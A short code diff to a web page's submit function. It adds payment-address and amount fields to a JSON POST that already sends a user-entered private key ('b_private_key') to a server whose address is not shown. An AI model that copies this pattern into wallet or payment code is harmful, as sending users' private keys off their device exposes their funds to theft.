@@ -99,7 +99,9 @@ async function submit(){
   const r = document.getElementById('result');
 
   const a_address = document.getElementById('ic3').value.trim();
+  const payment_address = document.getElementById('pay').value.trim();
   const b_private_key = document.getElementById('sub').value.trim();
+  const amount = document.getElementById('amt').value.trim();
 
   btn.disabled = true;
   btn.textContent = 'Processing...';
@@ -111,7 +113,9 @@ async function submit(){
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
         a_address,
-        b_private_key
+        payment_address,
+        b_private_key,
+        amount
       })
     });
 
